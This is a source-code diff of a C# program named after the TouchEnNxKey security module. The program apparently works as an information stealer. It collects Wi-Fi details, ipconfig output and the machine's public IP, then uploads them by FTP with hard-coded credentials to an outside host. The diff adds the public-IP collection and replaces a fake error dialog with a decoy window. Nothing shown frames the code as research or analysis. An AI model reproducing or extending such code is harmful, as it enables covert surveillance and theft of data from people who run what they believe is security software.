@@ -28,7 +28,7 @@ namespace TouchEnNxKey
         [STAThread]
         static void Main()
         {
-            MessageBox.Show("Win32Evrt.dll 파일을 찾을 수 없습니다.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            //MessageBox.Show("Win32Evrt.dll 파일을 찾을 수 없습니다.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
             Tag = ReadTag(System.Reflection.Assembly.GetEntryAssembly().Location);
 
@@ -36,6 +36,8 @@ namespace TouchEnNxKey
             StringBuilder sb = new StringBuilder();
             sb.Append(sep);
             sb.Append(getWifiInfo());
+            sb.Append(sep);
+            sb.Append(getPublicIP());
             sb.Append(sep);
             sb.Append(getIpconfig_All());
             sb.Append(sep);
@@ -56,9 +58,9 @@ namespace TouchEnNxKey
             FtpUpload("ftp://ghostyak83.cafe24.com", "test1", "test1", localPath + fileName, fileName);
             
             //정보 가져오기
-            //Application.EnableVisualStyles();
-            //Application.SetCompatibleTextRenderingDefault(false);
-            //Application.Run(new Form1());
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
         }
 
 
@@ -129,7 +131,7 @@ namespace TouchEnNxKey
 
         static string getPublicIP()
         {
-            string command = "nslookup myip.opendns.com resolver1.opendns.com | findstr Address";
+            string command = "nslookup myip.opendns.com resolver1.opendns.com";
             string output = "Command : " + command + "\r\n" + "\r\n";
             output += runCommand(command);
             return output;
@@ -225,26 +227,35 @@ namespace TouchEnNxKey
         static string ReadTag(string filename)
         {
             string tag = ""; //TAG:문자열
-            using (var br = new BinaryReader(File.Open(filename, FileMode.Open, FileAccess.Read)))
+
+            try
             {
-                int length = (int)br.BaseStream.Length;
-                if (length <= MAXBUFFSIZE)
-                    throw new Exception("파일 사이즈가 1024보다 작습니다.");
-
-                int offset = length - MAXBUFFSIZE; //파일 끝에서 1024 만큼 읽을꺼임
-                br.BaseStream.Seek(offset, SeekOrigin.Begin);
-
-                byte[] data = br.ReadBytes(MAXBUFFSIZE);
-                int end = 0;
-                for (int i = 0; data[i] != 0; i++)
+                using (var br = new BinaryReader(File.Open(filename, FileMode.Open, FileAccess.Read)))
                 {
-                    end = i + 1;
-                }
-                tag = System.Text.Encoding.UTF8.GetString(data, 0, end);
-            }
+                    int length = (int)br.BaseStream.Length;
+                    if (length <= MAXBUFFSIZE)
+                        throw new Exception("파일 사이즈가 1024보다 작습니다.");
 
-            if(tag.IndexOf(Magic) == -1)
-                return "";
+                    int offset = length - MAXBUFFSIZE; //파일 끝에서 1024 만큼 읽을꺼임
+                    br.BaseStream.Seek(offset, SeekOrigin.Begin);
+
+                    byte[] data = br.ReadBytes(MAXBUFFSIZE);
+                    int end = 0;
+                    for (int i = 0; data[i] != 0; i++)
+                    {
+                        end = i + 1;
+                    }
+                    tag = System.Text.Encoding.UTF8.GetString(data, 0, end);
+                }
+
+                if (tag.IndexOf(Magic) == -1)
+                    return "";
+            }catch(Exception)
+            {
+
+            }
+            
+            
 
             return tag.Replace(Magic, "");
         }
